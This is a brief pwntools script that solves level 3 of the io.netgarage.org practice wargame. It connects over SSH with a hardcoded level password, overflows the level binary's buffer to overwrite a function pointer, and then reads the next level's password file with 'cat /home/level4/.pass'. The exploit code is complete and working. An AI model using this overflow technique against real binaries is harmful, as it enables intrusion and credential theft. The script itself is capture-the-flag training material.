from pwn import *
s = ssh(user='level3', host='io.netgarage.org', password='OlhCmdZKbuzqngfz', port=22)
# game at http://io.netgarage.org/
sh = s.run('/levels/level03 $(python -c \'print 76*"a"+"\\x74\\x84\\x04\\x08"\')')
# using a buffer overflow we overwrite the function pointer
good = p32(0x8048474)
for i in range(3):
    print(sh.recvline(timeout=2))
sh.sendline(b'cat /home/level4/.pass')
log.info('Password : '+sh.recvline(timeout=2).decode('utf-8')[8:])
s.close()
